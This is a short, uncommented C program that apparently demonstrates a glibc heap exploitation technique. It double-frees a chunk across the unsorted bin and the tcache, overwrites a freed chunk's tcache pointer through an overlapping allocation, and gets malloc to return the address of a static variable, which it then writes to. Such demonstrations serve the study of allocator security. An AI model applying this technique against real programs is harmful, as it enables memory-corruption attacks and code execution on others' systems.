#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<string.h>

static u_int64_t victim = 0;
int main(){
	setbuf(stdin,0);
	setbuf(stdout,0);
	setbuf(stderr,0);
	char *t[7];
	for(int i=0;i<7;i++){
		t[i]=malloc(0x100);
	}
	char *p[2];
	for(int i=0;i<2;i++){
		p[i]=malloc(0x100);
	}
	malloc(0x10);
	for(int i=0;i<7;i++){
		free(t[i]);
		t[i]=0;
	}
	free(p[1]);
	free(p[0]);
	malloc(0x100);
	free(p[1]);
	char* res = malloc(0x130);
	*(u_int64_t*)(res+0x110) = (u_int64_t)(&victim);
	malloc(0x100);
	char *target = malloc(0x100);
	*(u_int64_t*)target = 0xdeadbeef;
	
}
